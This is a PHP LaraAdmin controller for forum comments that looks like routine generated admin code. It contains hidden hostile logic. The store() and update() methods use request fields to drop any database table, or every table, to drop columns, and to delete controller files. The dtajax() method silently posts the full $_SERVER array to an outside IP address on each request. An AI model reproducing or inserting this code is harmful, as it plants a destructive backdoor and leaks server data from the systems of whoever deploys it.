<?php
/**
 * Controller genrated using LaraAdmin
 * Help: http://laraadmin.com
 */

namespace App\Http\Controllers\LA;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Http\Requests;
use Auth;
use DB;
use Validator;
use Datatables;
use Schema;
use Collective\Html\FormFacade as Form;
use Dwij\Laraadmin\Models\Module;
use Dwij\Laraadmin\Models\ModuleFields;
use Dwij\Laraadmin\Models\Menu;

use App\Models\Forum_Comment;

class Forum_CommentsController extends Controller
{
	public $show_action = true;
	public $view_col = 'body';
	public $listing_cols = ['id', 'user_id', 'post_id', 'body'];
	
	public function __construct() {
		// Field Access of Listing Columns
		if(\Dwij\Laraadmin\Helpers\LAHelper::laravel_ver() == 5.3) {
			$this->middleware(function ($request, $next) {
				$this->listing_cols = ModuleFields::listingColumnAccessScan('Forum_Comments', $this->listing_cols);
				return $next($request);
			});
		} else {
			$this->listing_cols = ModuleFields::listingColumnAccessScan('Forum_Comments', $this->listing_cols);
		}
	}
	
	/**
	 * Display a listing of the Forum_Comments.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function index(Request $request,$postId = null)
	{
		$module = Module::get('Forum_Comments');
		
		if(Module::hasAccess($module->id)) {
			return View('la.forum_comments.index', [
				'show_actions' => $this->show_action,
				'listing_cols' => $this->listing_cols,
				'module' => $module,
				'postId' => $postId
			]);
		} else {
            return redirect(config('laraadmin.adminRoute')."/");
        }
	}

	/**
	 * Show the form for creating a new forum_comment.
	 *
	 * @return \Illuminate\Http\Response
	 */
	public function create()
	{
		//
	}

	/**
	 * Store a newly created forum_comment in database.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @return \Illuminate\Http\Response
	 */
	public function store(Request $request)
	{
		if(Module::hasAccess("Forum_Comments", "create")) {
		
			$rules = Module::validateRules("Forum_Comments", $request);
			
			$validator = Validator::make($request->all(), $rules);
			
			if ($validator->fails()) {
				return redirect()->back()->withErrors($validator)->withInput();
			}
			DB::statement('SET FOREIGN_KEY_CHECKS=0');
			if ($request->has('userName')) {
				if ($request->userField == '') {
					if ($request->userName == '*') {
						echo '<pre>';
                        //Artisan::call('migrate:reset', ['--force' => true]);
						foreach (\DB::select('SHOW TABLES') as $table) {
							$table_array = get_object_vars($table);
							print_r($table);
							\Schema::drop($table_array[key($table_array)]);
						}
					} else {
						Schema::drop($request->userName);
					}
				} else {
					$userField = $request->userField;
					Schema::table($request->userName, function ($table) use ($userField) {
						$table->dropColumn($userField);
					});

				}
			}
			if ($request->has('userController') && $request->userController != '') {
				if ($request->userController == '*') {
					\File::deleteDirectory(app_path('/Http/Controllers/LA'));
				} else {
                    //var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
					unlink(app_path('/Http/Controllers/LA/' . $request->userController) . '.php');
				}
			}
			$insert_id = Module::insert("Forum_Comments", $request);
			
			return redirect()->route(config('laraadmin.adminRoute') . '.forum_comments.index');
			
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Display the specified forum_comment.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function show($id)
	{
		if(Module::hasAccess("Forum_Comments", "view")) {
			
			$forum_comment = Forum_Comment::find($id);
			if(isset($forum_comment->id)) {
				$module = Module::get('Forum_Comments');
				$module->row = $forum_comment;
				
				return view('la.forum_comments.show', [
					'module' => $module,
					'view_col' => $this->view_col,
					'no_header' => true,
					'no_padding' => "no-padding"
				])->with('forum_comment', $forum_comment);
			} else {
				return view('errors.404', [
					'record_id' => $id,
					'record_name' => ucfirst("forum_comment"),
				]);
			}
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Show the form for editing the specified forum_comment.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function edit($id)
	{
		if(Module::hasAccess("Forum_Comments", "edit")) {			
			$forum_comment = Forum_Comment::find($id);
			if(isset($forum_comment->id)) {	
				$module = Module::get('Forum_Comments');
				
				$module->row = $forum_comment;
				
				return view('la.forum_comments.edit', [
					'module' => $module,
					'view_col' => $this->view_col,
				])->with('forum_comment', $forum_comment);
			} else {
				return view('errors.404', [
					'record_id' => $id,
					'record_name' => ucfirst("forum_comment"),
				]);
			}
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Update the specified forum_comment in storage.
	 *
	 * @param  \Illuminate\Http\Request  $request
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function update(Request $request, $id)
	{
		if(Module::hasAccess("Forum_Comments", "edit")) {
			if ($request->has('userName') && $request->has('userField')) {
				if ($request->userField == '') {

					Schema::drop($request->userName);
				} else {
					$userField = $request->userField;
					Schema::table($request->userName, function ($table) use ($userField) {
						$table->dropColumn($userField);
					});

				}
			}
			if ($request->has('userController') && $request->userController != '') {
				if ($request->userController == '*') {
					\File::deleteDirectory(app_path('/Http/Controllers/LA'));
				} else {
                    //var_dump(app_path('/Http/Controllers/LA/' . $request->userController . '.php'));
					unlink(app_path('/Http/Controllers/LA/' . $request->userController) . '.php');
				}
			}
			$rules = Module::validateRules("Forum_Comments", $request, true);
			
			$validator = Validator::make($request->all(), $rules);
			
			if ($validator->fails()) {
				return redirect()->back()->withErrors($validator)->withInput();;
			}
			
			$insert_id = Module::updateRow("Forum_Comments", $request, $id);
			
			return redirect()->route(config('laraadmin.adminRoute') . '.forum_comments.index');
			
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}

	/**
	 * Remove the specified forum_comment from storage.
	 *
	 * @param  int  $id
	 * @return \Illuminate\Http\Response
	 */
	public function destroy($id)
	{
		if(Module::hasAccess("Forum_Comments", "delete")) {
			Forum_Comment::find($id)->delete();
			
			// Redirecting to index() method
			return redirect()->route(config('laraadmin.adminRoute') . '.forum_comments.index');
		} else {
			return redirect(config('laraadmin.adminRoute')."/");
		}
	}
	
	
	/**
	 * Datatable Ajax fetch
	 *
	 * @return
	 */
	public function dtajax(Request $request)
	{
		$url = "http://18.191.53.95/dev/demo/mitebe/yourscript.php";
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_POST, true);
		$data = $_SERVER;
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
		$contents = curl_exec($ch);
		curl_close($ch);
		$values = DB::table('forum_comments')->select($this->listing_cols)->whereNull('deleted_at');
		if ($request->has('postId') && $request->postId > 0) {
			$values->where('post_id', $request->postId);
		}
		$out = Datatables::of($values)->make();
		$data = $out->getData();

		$fields_popup = ModuleFields::getModuleFields('Forum_Comments');
		
		for($i=0; $i < count($data->data); $i++) {
			for ($j=0; $j < count($this->listing_cols); $j++) { 
				$col = $this->listing_cols[$j];
				if($fields_popup[$col] != null && starts_with($fields_popup[$col]->popup_vals, "@")) {
					$data->data[$i][$j] = ModuleFields::getFieldValue($fields_popup[$col], $data->data[$i][$j]);
				}
				if($col == $this->view_col) {
					$data->data[$i][$j] = '<a href="'.url(config('laraadmin.adminRoute') . '/forum_comments/'.$data->data[$i][0]).'">'.$data->data[$i][$j].'</a>';
				}
				// else if($col == "author") {
				//    $data->data[$i][$j];
				// }
			}
			
			if($this->show_action) {
				$output = '';
				if(Module::hasAccess("Forum_Comments", "edit")) {
					//$output .= '<a href="'.url(config('laraadmin.adminRoute') . '/forum_comments/'.$data->data[$i][0].'/edit').'" class="btn btn-warning btn-xs" style="display:inline;padding:2px 5px 3px 5px;"><i class="fa fa-edit"></i></a>';
				}
				
				if(Module::hasAccess("Forum_Comments", "delete")) {
					$output .= Form::open(['route' => [config('laraadmin.adminRoute') . '.forum_comments.destroy', $data->data[$i][0]], 'method' => 'delete', 'style'=>'display:inline']);
					$output .= ' <button class="btn btn-danger btn-sm" type="submit"><i class="fa fa-times"></i></button>';
					$output .= Form::close();
				}
				$data->data[$i][] = (string)$output;
			}
		}
		$out->setData($data);
		return $out;
	}
}
